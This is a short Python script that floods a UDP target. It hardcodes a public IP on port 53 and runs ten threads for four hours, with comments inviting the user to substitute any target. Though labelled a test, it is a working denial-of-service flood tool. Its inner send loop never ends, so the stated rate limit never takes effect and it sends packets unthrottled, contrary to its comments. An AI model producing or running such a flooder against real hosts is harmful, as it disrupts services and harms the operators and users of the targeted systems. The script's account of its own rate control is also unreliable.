#!/bin/python
import socket
import threading
import time

# Target IP and UDP port
target_ip = '44.228.249.3'  # Replace with your target IP address
target_port = 53  # Replace with your target UDP port

# Payload to send (you can customize this)
message = b'Hello UDP!'

# Number of requests to send per second
requests_per_second = 15000

# Duration of the test in seconds (4 hours)
test_duration = 4 * 60 * 60  # 4 hours * 60 minutes * 60 seconds

# Create a UDP socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Function to send UDP packets
def send_udp():
    while True:
        client_socket.sendto(message, (target_ip, target_port))

# Function to control the sending rate
def control_send_rate():
    interval = 1.0 / requests_per_second
    start_time = time.time()
    while time.time() - start_time < test_duration:
        send_udp()
        time.sleep(interval)

# Create and start multiple threads for sending
num_threads = 10  # Adjust the number of threads based on your system capabilities
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=control_send_rate)
    thread.start()
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()

# Close the socket when done
client_socket.close()
